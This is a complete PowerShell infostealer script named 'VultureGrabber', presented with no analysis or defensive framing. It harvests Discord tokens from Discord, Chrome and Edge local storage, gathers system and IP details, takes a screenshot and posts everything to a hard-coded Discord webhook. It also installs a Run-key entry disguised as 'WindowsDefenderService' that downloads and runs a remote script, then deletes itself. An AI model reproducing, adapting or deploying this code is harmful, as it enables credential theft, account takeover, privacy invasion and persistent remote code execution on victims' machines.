# === SIMPLIFIED WORKING PAYLOAD ===
$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# === CONFIG ===
$webhook = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"

# === SYSTEM INFO ===
$pc  = $env:COMPUTERNAME
$usr = $env:USERNAME
$os  = [System.Environment]::OSVersion.VersionString
$adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3) } catch { $ip = "unknown" }

# === DISCORD TOKEN GRAB (from local storage) ===
$tokens = @()
$paths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb",
    "$env:APPDATA\DiscordCanary\Local Storage\leveldb",
    "$env:APPDATA\DiscordPTB\Local Storage\leveldb",
    "$env:APPDATA\Lightcord\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
)
$regex = '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}'
foreach ($p in $paths) {
    if (Test-Path $p) {
        Get-ChildItem $p -File -Include *.ldb,*.log -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($content) {
                $matches = [regex]::Matches($content, $regex)
                foreach ($m in $matches) { $tokens += $m.Value }
            }
        }
    }
}
$tokens = $tokens | Select-Object -Unique

# === SCREENSHOT ===
$screenshotB64 = $null
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $screenshotB64 = [Convert]::ToBase64String($ms.ToArray())
    $bitmap.Dispose(); $graphics.Dispose(); $ms.Dispose()
} catch { $screenshotB64 = $null }

# === BUILD AND SEND WEBHOOK ===
$fields = @(
    @{ name = "IP"; value = $ip; inline = $true },
    @{ name = "PC"; value = $pc; inline = $true },
    @{ name = "User"; value = $usr; inline = $true },
    @{ name = "Admin"; value = $adm; inline = $true },
    @{ name = "OS"; value = $os; inline = $true },
    @{ name = "Tokens Found"; value = $tokens.Count; inline = $true }
)

if ($screenshotB64) {
    $fields += @{ name = "Screenshot"; value = "Attached below"; inline = $false }
}

if ($tokens.Count -gt 0) {
    $fields += @{ name = "Tokens"; value = ($tokens -join "`n"); inline = $false }
}

$embed = @{
    embeds = @(
        @{
            title  = "VultureGrabber"
            color  = 16711680
            fields = $fields
            footer = @{ text = "VultureGrabber" }
        }
    )
}
$jsonBody = $embed | ConvertTo-Json -Depth 10 -Compress

try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 5
} catch {}

# === SEND SCREENSHOT AS FILE (if captured) ===
if ($screenshotB64) {
    try {
        $imgBytes = [Convert]::FromBase64String($screenshotB64)
        $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"`r`nContent-Type: image/png`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"
        $headerBytes = [System.Text.Encoding]::ASCII.GetBytes($header)
        $footerBytes = [System.Text.Encoding]::ASCII.GetBytes($footer)
        $bodyBytes = New-Object byte[] ($headerBytes.Length + $imgBytes.Length + $footerBytes.Length)
        [Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
        [Buffer]::BlockCopy($imgBytes, 0, $bodyBytes, $headerBytes.Length, $imgBytes.Length)
        [Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $imgBytes.Length, $footerBytes.Length)
        Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 8
    } catch {}
}

# === PERSISTENCE (Registry Run) ===
$psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex (irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
$psCmd = "powershell.exe $psArgs"
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderService" -Value $psCmd -Type String -ErrorAction SilentlyContinue
} catch {}

# === SELF-DELETE ===
try {
    if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
        Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
    }
} catch {}
